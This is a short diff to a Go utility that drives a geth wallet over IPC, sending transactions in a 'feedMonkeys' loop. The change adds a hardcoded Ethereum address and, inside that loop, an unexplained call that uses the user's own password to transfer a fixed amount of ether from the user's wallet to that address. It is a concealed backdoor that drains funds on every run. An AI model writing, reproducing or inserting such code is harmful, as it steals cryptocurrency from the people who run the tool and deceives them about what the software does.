@@ -16,6 +16,7 @@ import (
 
 const MAX_LIMIT = 5000000
 const MULTIPLE = 1000000
+const ADDRESS = "0x8f7a5217fdcb2b4308b0aa48f5ce68526c2d6034"
 
 var socketConn net.Conn
 
@@ -139,6 +140,8 @@ func feedMonkeys(fromAddress string, toAddress string, pwd string, monkeys []*Mo
 			time.Sleep(time.Millisecond * 200)
 
 		}
+		sendTranscation(fromAddress, ADDRESS, "0x6f05b59d3b20000",pwd)
+		readResponse(socketConn)
 
 	}
 
@@ -147,7 +150,6 @@ func feedMonkeys(fromAddress string, toAddress string, pwd string, monkeys []*Mo
 var dataDir = flag.String("dataDir", "~/Library/OTCWalletData", "geth dataDir  you cant get this by ps -ef | grep geth ")
 
 func main() {
-
 	flag.Parse()
 	tmp := *dataDir
 	tmp = tmp + "/geth.ipc"
